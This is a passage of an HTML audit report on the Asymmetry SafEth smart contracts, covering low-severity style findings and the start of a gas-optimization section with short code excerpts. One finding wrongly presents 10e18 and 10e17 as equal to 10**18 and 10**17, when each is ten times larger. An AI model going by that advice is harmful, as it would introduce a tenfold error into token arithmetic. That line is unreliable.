approach throughout the codebase to improve the explicitness and readability of the code.</p>\n<h2 id=\"22-imports-can-be-group\" style=\"position:relative;\"><a href=\"#22-imports-can-be-group\" aria-label=\"22 imports can be group permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[22] Imports can be group</h2>\n<p>Consider grouping the imports, e.g. first libraries, then interfaces, the storage.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L4-L11\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L4-L11</a></p>\n<h2 id=\"23-order-of-functions\" style=\"position:relative;\"><a href=\"#23-order-of-functions\" aria-label=\"23 order of functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[23] Order of functions</h2>\n<p>The solidity <a href=\"https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions\">documentation</a> recommends the following order for functions:</p>\n<ul>\n<li>constructor</li>\n<li>receive function (if exists)</li>\n<li>fallback function (if exists)</li>\n<li>external</li>\n<li>public</li>\n<li>internal</li>\n<li>private</li>\n</ul>\n<p>The receive() functions are currently in the bottom on the contract.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L246\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L246</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L97\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L97</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L244\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L244</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L126\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L126</a></p>\n<h2 id=\"24-add-a-limit-for-the-maximum-number-of-characters-per-line\" style=\"position:relative;\"><a href=\"#24-add-a-limit-for-the-maximum-number-of-characters-per-line\" aria-label=\"24 add a limit for the maximum number of characters per line permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[24] Add a limit for the maximum number of characters per line</h2>\n<p>The solidity <a href=\"https://docs.soliditylang.org/en/v0.8.17/style-guide.html#maximum-line-length\">documentation</a> recommends a maximum of 120 characters.</p>\n<p>Consider adding a limit of 120 characters or less to prevent large lines.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L142\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L142</a></p>\n<h2 id=\"25-use-scientific-notation-rather-than-exponentiation\" style=\"position:relative;\"><a href=\"#25-use-scientific-notation-rather-than-exponentiation\" aria-label=\"25 use scientific notation rather than exponentiation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[25] Use scientific notation rather than exponentiation</h2>\n<p>Scientific notation can be used for better code readability, e.g. consider using using <code>10e18</code> and <code>10e17</code> instead of <code>10**18</code> and <code>10**17</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L54-L55\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L54-L55</a></p>\n<h2 id=\"26-specify-the-warning-being-disabled-by-the-linter\" style=\"position:relative;\"><a href=\"#26-specify-the-warning-being-disabled-by-the-linter\" aria-label=\"26 specify the warning being disabled by the linter permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[26] Specify the warning being disabled by the linter</h2>\n<p>Consider also adding the name of the warning being disabled, e.g. <code>// solhint-disable-next-line warning-name</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L123-L126\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L123-L126</a></p>\n<h2 id=\"27-replace-variable--false-with-variable\" style=\"position:relative;\"><a href=\"#27-replace-variable--false-with-variable\" aria-label=\"27 replace variable  false with variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[27] Replace <code>variable == false</code> with <code>!variable</code></h2>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L64\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L64</a></p>\n<h2 id=\"28-interchangeable-usage-of-uint-and-uint256\" style=\"position:relative;\"><a href=\"#28-interchangeable-usage-of-uint-and-uint256\" aria-label=\"28 interchangeable usage of uint and uint256 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[28] Interchangeable usage of uint and uint256</h2>\n<p>Consider using only one approach, e.g. only uint256.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L91-L92\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L91-L92</a></p>\n<h2 id=\"29-can-use-ternary\" style=\"position:relative;\"><a href=\"#29-can-use-ternary\" aria-label=\"29 can use ternary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[29] Can use ternary</h2>\n<p>The following instance can use a ternary expression instead of a conditional.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L78-L81\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L78-L81</a></p>\n<h2 id=\"30-package-balancer-labsbalancer-js-is-not-used\" style=\"position:relative;\"><a href=\"#30-package-balancer-labsbalancer-js-is-not-used\" aria-label=\"30 package balancer labsbalancer js is not used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[30] Package @balancer-labs/balancer-js is not used</h2>\n<p>The package @balancer-labs/balancer-js is deprecated and balancer recommends to use the @balancer-labs/sdk package instead. Also, this package is currently unused on the tests and deployment setups. Consider removing this package. </p>\n<p>This is not a vulnerability, but removing this package is beneficial to the project, since unnecessary packages incurs overhead and increases the project download time and size.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/package.json#L78\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/package.json#L78</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/967#issuecomment-1500677486\">toshiSat (Asymmetry) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/967#issuecomment-1535992644\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>14, 15, 16, &#x26; 20 are GAS findings more than QA.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 55 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/235\">report highlighted below</a> by <strong>Rolezn</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1136\">ArbitraryExecution</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1134\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1120\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1119\">alexzoid</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1100\">c3phas</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1084\">MiksuJak</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1072\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1030\">EvanW</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1019\">maxper</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/995\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/983\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/979\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/975\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/951\">hunter_w3b</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/901\">tank</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/827\">tnevler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/782\">mahdirostami</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/780\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/773\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/768\">Madalad</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/733\">0xpanicError</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/723\">IgorZuk</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/680\">Bason</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/669\">yac</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/656\">wen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/631\">pixpi</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/630\">Angry_Mustache_Man</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/608\">inmarelibero</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/597\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/560\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/556\">Franfran</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/539\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/450\">JCN</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/443\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/413\">BlueAlder</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/406\">smaul</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/400\">MiniGlome</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/372\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/371\">HHK</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/361\">arialblack14</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/358\">anodaram</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/299\">Rickard</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/280\">codeslide</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/274\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/227\">0xGordita</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/179\">ernestognw</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/178\">dicethedev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/130\">4lulz</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/83\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/82\">pavankv</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/79\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/62\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/52\">Sathish9098</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/41\">georgits</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"left\">Contexts</th>\n<th align=\"center\">Estimated Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑01]</td>\n<td align=\"left\">Setting the <code>constructor</code> to <code>payable</code></td>\n<td align=\"left\">4</td>\n<td align=\"center\">52</td>\n</tr>\n<tr>\n<td>[G‑02]</td>\n<td align=\"left\">Duplicated <code>require()</code>/<code>revert()</code> Checks Should Be Refactored To A Modifier Or Function</td>\n<td align=\"left\">2</td>\n<td align=\"center\">56</td>\n</tr>\n<tr>\n<td>[G‑03]</td>\n<td align=\"left\">Empty Blocks Should Be Removed Or Emit Something</td>\n<td align=\"left\">4</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑04]</td>\n<td align=\"left\">Using <code>delete</code> statement can save gas</td>\n<td align=\"left\">3</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑05]</td>\n<td align=\"left\">Functions guaranteed to revert when called by normal users can be marked <code>payable</code></td>\n<td align=\"left\">17</td>\n<td align=\"center\">357</td>\n</tr>\n<tr>\n<td>[G‑06]</td>\n<td align=\"left\">Use hardcoded address instead <code>address(this)</code></td>\n<td align=\"left\">22</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑07]</td>\n<td align=\"left\">Optimize names to save gas</td>\n<td align=\"left\">3</td>\n<td align=\"center\">66</td>\n</tr>\n<tr>\n<td>[G‑08]</td>\n<td align=\"left\"><code>&#x3C;x> += &#x3C;y></code> Costs More Gas Than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> For State Variables</td>\n<td align=\"left\">4</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑09]</td>\n<td align=\"left\">Public Functions To External</td>\n<td align=\"left\">9</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑10]</td>\n<td align=\"left\">Save gas with the use of specific import statements</td>\n<td align=\"left\">22</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑11]</td>\n<td align=\"left\">Using <code>unchecked</code> blocks to save gas</td>\n<td align=\"left\">6</td>\n<td align=\"center\">120</td>\n</tr>\n<tr>\n<td>[G‑12]</td>\n<td align=\"left\">Use functions instead of modifiers</td>\n<td align=\"left\">1</td>\n<td align=\"center\">100</td>\n</tr>\n<tr>\n<td>[G‑13]</td>\n<td align=\"left\">Use solidity version 0.8.19 to gain some gas boost</td>\n<td align=\"left\">4</td>\n<td align=\"center\">352</td>\n</tr>\n<tr>\n<td>[G‑14]</td>\n<td align=\"left\">Save loop calls</td>\n<td align=\"left\">3</td>\n<td align=\"center\">-</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 104 contexts over 14 issues</p>\n<h2 id=\"g-01-setting-the-constructor-to-payable\" style=\"position:relative;\"><a href=\"#g-01-setting-the-constructor-to-payable\" aria-label=\"g 01 setting the constructor to payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Setting the <code>constructor</code> to <code>payable</code></h2>\n<p>Saves ~13 gas per instance.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">: </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">()</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L38\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L38</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">: </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">()</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L33\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L33</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">: </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">()</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L27\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L27</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">: </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">()</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L24\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L24</a></p>\n<h2 id=\"g-02-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\" style=\"position:relative;\"><a href=\"#g-02-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\" aria-label=\"g 02 duplicated requirerevert checks should be refactored to a modifier or function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Duplicated <code>require()</code>/<code>revert()</code> Checks Should Be Refactored To A Modifier Or Function</h2>\n<p>Saves deployment costs.</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 